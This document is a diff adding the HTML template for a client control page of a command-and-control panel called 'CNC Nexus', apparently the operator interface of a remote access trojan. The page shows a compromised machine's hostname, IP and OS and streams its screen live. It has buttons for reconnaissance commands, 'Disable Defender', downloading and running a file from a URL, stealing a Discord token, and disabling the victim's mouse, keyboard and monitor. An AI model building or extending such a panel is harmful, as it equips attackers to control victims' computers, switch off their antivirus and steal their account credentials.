@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Client Control - CNC Nexus</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="/static/css/client.css">
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+</head>
+<body>
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>
+
+    <div class="client-container">
+        <!-- Header -->
+        <header class="client-header">
+            <div class="header-content">
+                <a href="/" class="back-link"><i class="fas fa-arrow-left"></i> Back to Dashboard</a>
+                <h1 id="client-title">Client Control</h1>
+                <div class="header-status">
+                    <span id="status-indicator" class="status-dot"></span>
+                    <span id="status-text">OFFLINE</span>
+                </div>
+            </div>
+        </header>
+
+        <!-- Main Content -->
+        <main class="client-main">
+            <!-- Left Panel: Screen (Half Size) -->
+            <div class="screen-panel">
+                <div class="panel-header">
+                    <h2><i class="fas fa-desktop"></i> Live Screen</h2>
+                    <div class="controls">
+                        <label class="toggle-switch">
+                            <input type="checkbox" id="screen-toggle" onchange="toggleScreenStream()">
+                            <span class="slider"></span>
+                        </label>
+                        <span id="fps-counter" class="fps-counter">0 FPS</span>
+                    </div>
+                </div>
+                <div class="screen-container">
+                    <canvas id="screen-canvas"></canvas>
+                    <div class="screen-overlay" id="screen-overlay">Toggle to enable screen streaming</div>
+                </div>
+            </div>
+
+            <!-- Right Panel: Controls -->
+            <div class="control-panel">
+                <!-- Client Info -->
+                <div class="info-card">
+                    <h3><i class="fas fa-info-circle"></i> Client Information</h3>
+                    <div class="info-grid">
+                        <div class="info-item">
+                            <label>Hostname</label>
+                            <p id="info-hostname">-</p>
+                        </div>
+                        <div class="info-item">
+                            <label>IP Address</label>
+                            <p id="info-ip">-</p>
+                        </div>
+                        <div class="info-item">
+                            <label>OS</label>
+                            <p id="info-os">-</p>
+                        </div>
+                        <div class="info-item">
+                            <label>Client ID</label>
+                            <p id="info-client-id">-</p>
+                        </div>
+                        <div class="info-item">
+                            <label>Last Seen</label>
+                            <p id="info-last-seen">-</p>
+                        </div>
+                        <div class="info-item">
+                            <label>Registered</label>
+                            <p id="info-registered">-</p>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Command Output -->
+                <div class="output-card">
+                    <h3><i class="fas fa-terminal"></i> Output</h3>
+                    <div id="command-output" class="command-output">Ready for commands...</div>
+                </div>
+            </div>
+        </main>
+
+        <!-- Context Menu with Tabs -->
+        <div id="context-menu" class="context-menu">
+            <div class="context-wrapper">
+                <div class="context-tabs">
+                    <button class="context-tab-btn active" onclick="switchContextTab('main')">Main</button>
+                    <button class="context-tab-btn" onclick="switchContextTab('commands')">Commands</button>
+                    <button class="context-tab-btn" onclick="switchContextTab('custom')">Custom</button>
+                    <button class="context-tab-btn" onclick="switchContextTab('info')">Information</button>
+                </div>
+                <div class="context-content">
+
+            <!-- Main Tab -->
+            <div id="context-main" class="context-tab-content active">
+                <div class="context-item" onclick="contextAction('view')"><i class="fas fa-eye"></i> View Client</div>
+                <div class="context-item" onclick="contextAction('screenshot')"><i class="fas fa-camera"></i> Screenshot</div>
+                <div class="context-item" onclick="contextAction('connect')"><i class="fas fa-link"></i> Connect</div>
+            </div>
+
+            <!-- Commands Tab -->
+            <div id="context-commands" class="context-tab-content">
+                <div class="context-item" onclick="contextExecuteCommand('whoami')"><i class="fas fa-user"></i> whoami</div>
+                <div class="context-item" onclick="contextExecuteCommand('ipconfig')"><i class="fas fa-network-wired"></i> ipconfig</div>
+                <div class="context-item" onclick="contextExecuteCommand('tasklist')"><i class="fas fa-tasks"></i> tasklist</div>
+                <div class="context-item" onclick="contextExecuteCommand('systeminfo')"><i class="fas fa-server"></i> systeminfo</div>
+                <div class="context-item" onclick="contextExecuteCommand('dir')"><i class="fas fa-folder"></i> dir</div>
+                <div class="context-item" onclick="contextExecuteCommand('hostname')"><i class="fas fa-desktop"></i> hostname</div>
+                <hr>
+                <div class="context-item" onclick="contextExecuteCommand('tasklist /v')"><i class="fas fa-list"></i> tasklist /v</div>
+                <div class="context-item" onclick="contextExecuteCommand('netstat -an')"><i class="fas fa-network-wired"></i> netstat -an</div>
+                <div class="context-item" onclick="contextExecuteCommand('wmic os get caption')"><i class="fas fa-info-circle"></i> OS Info</div>
+            </div>
+
+                    <!-- Custom Tab -->
+                    <div id="context-custom" class="context-tab-content">
+                        <div class="context-item" onclick="contextExecuteCommand('disable_defender')"><i class="fas fa-shield-alt"></i> Disable Defender</div>
+                        <div class="context-item" onclick="showUrlDialog()"><i class="fas fa-cloud-download-alt"></i> Execute URL</div>
+                        <div class="context-item" onclick="showDiskDialog()"><i class="fas fa-hdd"></i> Execute Disk</div>
+                        <div class="context-item" onclick="contextExecuteCommand('get_discord_token')"><i class="fab fa-discord"></i> Discord Token</div>
+                        <div class="context-item" onclick="contextExecuteCommand('force_restart')"><i class="fas fa-power-off"></i> Force Restart</div>
+                        <div class="context-item" onclick="showMonitorDialog()"><i class="fas fa-monitor"></i> Turn Off Monitor</div>
+                        <div class="context-item" onclick="showMouseDialog()"><i class="fas fa-mouse"></i> Disable Mouse</div>
+                        <div class="context-item" onclick="showKeyboardDialog()"><i class="fas fa-keyboard"></i> Disable Keyboard</div>
+                    </div>
+
+                    <!-- Information Tab -->
+                    <div id="context-info" class="context-tab-content">
+                <div class="context-info-item">
+                    <label>Hostname:</label>
+                    <span id="ctx-hostname">-</span>
+                </div>
+                <div class="context-info-item">
+                    <label>IP Address:</label>
+                    <span id="ctx-ip">-</span>
+                </div>
+                <div class="context-info-item">
+                    <label>OS:</label>
+                    <span id="ctx-os">-</span>
+                </div>
+                <div class="context-info-item">
+                    <label>Status:</label>
+                    <span id="ctx-status">-</span>
+                </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Modern Popup Dialogs -->
+        <div id="popup-overlay" class="popup-overlay"></div>
+        
+        <!-- URL Dialog -->
+        <div id="url-dialog" class="popup-dialog">
+            <div class="popup-content">
+                <div class="popup-header">
+                    <h3><i class="fas fa-cloud-download-alt"></i> Execute File From URL</h3>
+                    <button class="popup-close" onclick="closeDialog('url-dialog')"><i class="fas fa-times"></i></button>
+                </div>
+                <div class="popup-body">
+                    <input type="text" id="url-input" placeholder="Enter file URL..." class="popup-input">
+                </div>
+                <div class="popup-footer">
+                    <button class="popup-btn-cancel" onclick="closeDialog('url-dialog')">Cancel</button>
+                    <button class="popup-btn-confirm" onclick="executeUrlCommand()">Execute</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Disk Dialog -->
+        <div id="disk-dialog" class="popup-dialog">
+            <div class="popup-content">
+                <div class="popup-header">
+                    <h3><i class="fas fa-hdd"></i> Execute File From Disk</h3>
+                    <button class="popup-close" onclick="closeDialog('disk-dialog')"><i class="fas fa-times"></i></button>
+                </div>
+                <div class="popup-body">
+                    <input type="text" id="disk-input" placeholder="Enter file path..." class="popup-input">
+                </div>
+                <div class="popup-footer">
+                    <button class="popup-btn-cancel" onclick="closeDialog('disk-dialog')">Cancel</button>
+                    <button class="popup-btn-confirm" onclick="executeDiskCommand()">Execute</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Monitor Dialog -->
+        <div id="monitor-dialog" class="popup-dialog">
+            <div class="popup-content">
+                <div class="popup-header">
+                    <h3><i class="fas fa-monitor"></i> Turn Off Monitor</h3>
+                    <button class="popup-close" onclick="closeDialog('monitor-dialog')"><i class="fas fa-times"></i></button>
+                </div>
+                <div class="popup-body">
+                    <label class="popup-label">Duration (seconds):</label>
+                    <input type="number" id="monitor-time" placeholder="Enter seconds..." class="popup-input" min="1" value="60">
+                </div>
+                <div class="popup-footer">
+                    <button class="popup-btn-cancel" onclick="closeDialog('monitor-dialog')">Cancel</button>
+                    <button class="popup-btn-confirm" onclick="executeMonitorCommand()">Turn Off</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Mouse Dialog -->
+        <div id="mouse-dialog" class="popup-dialog">
+            <div class="popup-content">
+                <div class="popup-header">
+                    <h3><i class="fas fa-mouse"></i> Disable Mouse</h3>
+                    <button class="popup-close" onclick="closeDialog('mouse-dialog')"><i class="fas fa-times"></i></button>
+                </div>
+                <div class="popup-body">
+                    <label class="popup-label">Duration (seconds):</label>
+                    <input type="number" id="mouse-time" placeholder="Enter seconds..." class="popup-input" min="1" value="60">
+                </div>
+                <div class="popup-footer">
+                    <button class="popup-btn-cancel" onclick="closeDialog('mouse-dialog')">Cancel</button>
+                    <button class="popup-btn-confirm" onclick="executeMouseCommand()">Disable</button>
+                </div>
+            </div>
+        </div>
+
+        <!-- Keyboard Dialog -->
+        <div id="keyboard-dialog" class="popup-dialog">
+            <div class="popup-content">
+                <div class="popup-header">
+                    <h3><i class="fas fa-keyboard"></i> Disable Keyboard</h3>
+                    <button class="popup-close" onclick="closeDialog('keyboard-dialog')"><i class="fas fa-times"></i></button>
+                </div>
+                <div class="popup-body">
+                    <label class="popup-label">Duration (seconds):</label>
+                    <input type="number" id="keyboard-time" placeholder="Enter seconds..." class="popup-input" min="1" value="60">
+                </div>
+                <div class="popup-footer">
+                    <button class="popup-btn-cancel" onclick="closeDialog('keyboard-dialog')">Cancel</button>
+                    <button class="popup-btn-confirm" onclick="executeKeyboardCommand()">Disable</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const clientId = "{{ client_id }}";
+    </script>
+    <script src="/static/js/client.js"></script>
+</body>
+</html>
